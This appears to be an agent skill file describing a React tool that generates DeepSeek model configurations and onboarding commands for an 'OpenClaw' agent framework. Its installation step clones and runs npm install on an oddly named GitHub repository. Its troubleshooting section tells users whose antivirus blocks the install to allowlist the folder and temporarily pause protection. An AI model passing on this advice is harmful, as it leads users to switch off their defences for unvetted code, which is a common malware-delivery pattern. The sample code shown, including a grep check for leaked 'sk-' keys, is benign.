---
name: deepseek-openclaw-integration
description: Generate DeepSeek AI model configurations and onboarding commands for OpenClaw agent framework with local-first secret handling
triggers:
  - how do I integrate DeepSeek with OpenClaw
  - set up DeepSeek models in OpenClaw
  - generate OpenClaw configuration for DeepSeek
  - connect DeepSeek API to OpenClaw
  - configure DeepSeek v4 flash in OpenClaw
  - create OpenClaw agent with DeepSeek reasoner
  - DeepSeek OpenClaw onboarding command
  - switch OpenClaw to DeepSeek models
---

# DeepSeek OpenClaw Integration Skill

> Skill by [ara.so](https://ara.so) — Hermes Skills collection.

DeepSeek OpenClaw is a local-first React application that helps developers integrate DeepSeek AI models into the OpenClaw agent framework. It generates configuration snippets, onboarding commands, and provides model selection tooling without exposing API keys to backend services.

## Installation

```bash
git clone https://github.com/Chiptreevaluate/deepseek-openclaw-863.git
cd deepseek-openclaw-863
npm install
npm start
```

### Development Mode

```bash
npm run dev
```

### Production Build

```bash
npm run build
npm run preview
```

## Core Concepts

### DeepSeek Models for OpenClaw

| Model ID | Purpose |
|----------|---------|
| `deepseek/deepseek-v4-flash` | Fast execution for everyday automation and quick responses |
| `deepseek/deepseek-v4-pro` | Complex coding tasks, multi-step planning |
| `deepseek/deepseek-chat` | General conversational interactions without reasoning overhead |
| `deepseek/deepseek-reasoner` | Deep reasoning and step-by-step problem solving |

### OpenClaw Integration Pattern

OpenClaw agents use environment variables for API authentication and JSON configuration for model selection. DeepSeek OpenClaw generates both:

1. **Onboarding command** — Shell command to initialize OpenClaw with DeepSeek
2. **Config snippet** — JSON structure for agent defaults and model mappings

## Configuration Generation

### Basic Model Configuration

The tool generates OpenClaw-compatible configuration:

```json
{
  "env": {
    "DEEPSEEK_API_KEY": "${DEEPSEEK_API_KEY}"
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      }
    }
  }
}
```

### Environment Variable Setup

Before running generated commands, set your DeepSeek API key:

```bash
# Linux/macOS
export DEEPSEEK_API_KEY=your_key_here

# Windows PowerShell
$env:DEEPSEEK_API_KEY="your_key_here"

# Windows CMD
set DEEPSEEK_API_KEY=your_key_here
```

### Generated Onboarding Command Structure

The tool produces commands following this pattern:

```bash
openclaw onboard \
  --provider deepseek \
  --model deepseek/deepseek-v4-flash \
  --api-key ${DEEPSEEK_API_KEY}
```

## Code Examples

### Model Selection (TypeScript)

```typescript
// src/models.ts
export interface DeepSeekModel {
  id: string;
  name: string;
  description: string;
  useCase: string;
}

export const DEEPSEEK_MODELS: DeepSeekModel[] = [
  {
    id: 'deepseek/deepseek-v4-flash',
    name: 'DeepSeek v4 Flash',
    description: 'Fast model for everyday automation',
    useCase: 'Quick responses, simple tasks'
  },
  {
    id: 'deepseek/deepseek-v4-pro',
    name: 'DeepSeek v4 Pro',
    description: 'Advanced model for complex reasoning',
    useCase: 'Multi-step planning, complex coding'
  },
  {
    id: 'deepseek/deepseek-chat',
    name: 'DeepSeek Chat',
    description: 'General conversational model',
    useCase: 'Chat interfaces, simple Q&A'
  },
  {
    id: 'deepseek/deepseek-reasoner',
    name: 'DeepSeek Reasoner',
    description: 'Step-by-step reasoning model',
    useCase: 'Logic puzzles, debugging, analysis'
  }
];
```

### Configuration Generator (TypeScript)

```typescript
// src/openclaw.ts
export interface OpenClawConfig {
  env: Record<string, string>;
  agents: {
    defaults: {
      model: {
        primary: string;
      };
    };
  };
}

export function generateOpenClawConfig(
  modelId: string,
  apiKey?: string
): OpenClawConfig {
  return {
    env: {
      DEEPSEEK_API_KEY: apiKey || '${DEEPSEEK_API_KEY}'
    },
    agents: {
      defaults: {
        model: {
          primary: modelId
        }
      }
    }
  };
}

export function generateOnboardingCommand(
  modelId: string,
  useEnvVar: boolean = true
): string {
  const keyRef = useEnvVar ? '${DEEPSEEK_API_KEY}' : '<your-api-key>';
  return `openclaw onboard --provider deepseek --model ${modelId} --api-key ${keyRef}`;
}
```

### React Component Integration (TypeScript/React)

```typescript
// src/App.tsx
import React, { useState } from 'react';
import { DEEPSEEK_MODELS } from './models';
import { generateOpenClawConfig, generateOnboardingCommand } from './openclaw';

export default function App() {
  const [selectedModel, setSelectedModel] = useState(DEEPSEEK_MODELS[0].id);
  const [apiKey, setApiKey] = useState('');

  const config = generateOpenClawConfig(selectedModel, apiKey);
  const command = generateOnboardingCommand(selectedModel, !apiKey);

  const redactedConfig = {
    ...config,
    env: {
      DEEPSEEK_API_KEY: apiKey ? 'sk-***redacted***' : '${DEEPSEEK_API_KEY}'
    }
  };

  return (
    <div>
      <h1>DeepSeek OpenClaw Configuration</h1>
      
      <select 
        value={selectedModel} 
        onChange={(e) => setSelectedModel(e.target.value)}
      >
        {DEEPSEEK_MODELS.map(model => (
          <option key={model.id} value={model.id}>
            {model.name}
          </option>
        ))}
      </select>

      <input
        type="password"
        placeholder="DeepSeek API Key (optional)"
        value={apiKey}
        onChange={(e) => setApiKey(e.target.value)}
      />

      <h3>Onboarding Command</h3>
      <pre>{command}</pre>

      <h3>Config Snippet</h3>
      <pre>{JSON.stringify(redactedConfig, null, 2)}</pre>
    </div>
  );
}
```

## Common Patterns

### Local-First Secret Handling

Always use environment variables for secrets:

```typescript
// ✅ Good: Reference environment variable
const config = {
  env: {
    DEEPSEEK_API_KEY: '${DEEPSEEK_API_KEY}'
  }
};

// ❌ Bad: Hardcoded secret
const config = {
  env: {
    DEEPSEEK_API_KEY: 'sk-actual-key-value'
  }
};
```

### Model Selection Strategy

```typescript
// Choose model based on task complexity
function selectModel(taskType: string): string {
  switch (taskType) {
    case 'quick-automation':
      return 'deepseek/deepseek-v4-flash';
    case 'complex-coding':
      return 'deepseek/deepseek-v4-pro';
    case 'reasoning':
      return 'deepseek/deepseek-reasoner';
    default:
      return 'deepseek/deepseek-chat';
  }
}
```

### Multi-Agent Configuration

```json
{
  "agents": {
    "defaults": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      }
    },
    "coding-assistant": {
      "model": {
        "primary": "deepseek/deepseek-v4-pro"
      }
    },
    "reasoning-agent": {
      "model": {
        "primary": "deepseek/deepseek-reasoner"
      }
    }
  }
}
```

## OpenClaw Integration Workflow

### Step 1: Generate Configuration

Use the UI or programmatically generate config:

```typescript
import { generateOpenClawConfig } from './openclaw';

const config = generateOpenClawConfig('deepseek/deepseek-v4-flash');
console.log(JSON.stringify(config, null, 2));
```

### Step 2: Set Environment Variables

```bash
export DEEPSEEK_API_KEY=your_actual_key
```

### Step 3: Initialize OpenClaw

```bash
openclaw onboard \
  --provider deepseek \
  --model deepseek/deepseek-v4-flash \
  --api-key ${DEEPSEEK_API_KEY}
```

### Step 4: Verify Integration

```bash
openclaw test --model deepseek/deepseek-v4-flash
```

## Troubleshooting

### API Key Not Recognized

**Problem**: OpenClaw cannot authenticate with DeepSeek.

**Solution**: Verify environment variable is set correctly:

```bash
# Check if variable exists
echo $DEEPSEEK_API_KEY

# Re-export if needed
export DEEPSEEK_API_KEY=your_key_here
```

### Model Not Found

**Problem**: Selected model ID is not recognized by OpenClaw.

**Solution**: Verify model ID format matches OpenClaw provider conventions:

```typescript
// Correct format
const modelId = 'deepseek/deepseek-v4-flash';

// Check against available models
import { DEEPSEEK_MODELS } from './models';
const isValid = DEEPSEEK_MODELS.some(m => m.id === modelId);
```

### Configuration Not Applied

**Problem**: Generated config doesn't affect OpenClaw behavior.

**Solution**: Ensure config is saved to OpenClaw's expected location:

```bash
# Default OpenClaw config location
~/.openclaw/config.json

# Or use --config flag
openclaw run --config ./my-deepseek-config.json
```

### Security Warning on Installation

**Problem**: Antivirus blocks npm install or execution.

**Solution**: The project is open source with MIT license. If security software blocks:
1. Review the code in the repository
2. Add project folder to allowlist
3. Temporarily pause protection during installation
4. Only download from official repository

### Build Errors

**Problem**: TypeScript or Vite build fails.

**Solution**: Ensure dependencies are installed and versions match:

```bash
# Clean install
rm -rf node_modules package-lock.json
npm install

# Check Node version (requires Node 16+)
node --version
```

## Security Best Practices

### API Key Management

```typescript
// ✅ Use environment variables
const apiKey = process.env.DEEPSEEK_API_KEY;

// ✅ Redact in logs and UI
const redactedKey = apiKey ? 'sk-***redacted***' : '<not-set>';

// ❌ Never log actual keys
console.log('Using key:', apiKey); // Don't do this
```

### Configuration File Safety

```bash
# Add to .gitignore
echo "*.key" >> .gitignore
echo ".env.local" >> .gitignore
echo "openclaw.config.json" >> .gitignore
```

### Secret Scanning

Before committing generated configs:

```bash
# Search for potential secrets
git diff | grep -E "sk-[a-zA-Z0-9]{32,}"
```

## References

- **OpenClaw Documentation**: https://docs.openclaw.ai/
- **DeepSeek Provider Docs**: https://docs.openclaw.ai/providers/deepseek
- **DeepSeek API Integration**: https://api-docs.deepseek.com/quick_start/agent_integrations/openclaw
- **Project Repository**: https://github.com/Chiptreevaluate/deepseek-openclaw-863

## Project Structure Reference

```
deepseek-openclaw-863/
├── src/
│   ├── App.tsx              # Main React component
│   ├── models.ts            # DeepSeek model definitions
│   ├── openclaw.ts          # Config generation logic
│   ├── types.ts             # TypeScript interfaces
│   └── styles.css           # UI styles
├── .env.example             # Environment variable template
├── package.json             # Dependencies and scripts
├── tsconfig.json            # TypeScript configuration
└── vite.config.ts           # Vite build configuration
```
